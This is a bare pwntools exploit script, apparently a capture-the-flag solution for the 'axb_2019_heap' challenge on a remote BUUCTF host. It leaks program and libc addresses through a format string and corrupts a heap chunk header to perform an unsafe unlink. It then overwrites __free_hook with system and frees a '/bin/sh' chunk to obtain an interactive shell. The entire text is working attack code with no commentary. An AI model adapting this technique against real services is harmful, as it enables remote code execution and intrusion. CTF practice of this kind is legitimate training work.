from pwn import *

context.log_level = 'debug'

p=remote('node3.buuoj.cn',29624)
elf=ELF('./axb_2019_heap')
libc=elf.libc

def add(idx,size,content):
	p.sendlineafter('>>','1')
	p.sendlineafter('):',str(idx))
	p.sendlineafter('size:',str(size))
	p.sendlineafter('content:',content)

def delete(idx):
	p.sendlineafter('>>','2')
	p.sendlineafter('index:',str(idx))

def edit(idx,content):
	p.sendlineafter('>>','4')
	p.sendlineafter('index:',str(idx))
	p.sendlineafter('content: \n',content)

def show():
	p.sendlineafter('>>','3')

p.recvuntil('name: ')
p.sendline('%11$p%15$p')
p.recvuntil('Hello, ')
base=int(p.recv(14),16)-0x1186
libcbase=int(p.recv(14),16)-libc.sym['__libc_start_main']-240
system=libcbase+libc.sym['system']
free_hook=libcbase+libc.sym['__free_hook']
bss=base+0x202060
add(0,0x98,'a'*0x98)#0
add(1,0x98,'bbbb')#1
add(2,0x90,'cccc')#2
add(3,0x90,'/bin/sh\x00')#3

payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+'\xa0'
edit(0,payload)
delete(1)
edit(0,p64(0)*3+p64(free_hook)+p64(0x10))
edit(0,p64(system))
delete(3)
p.interactive()
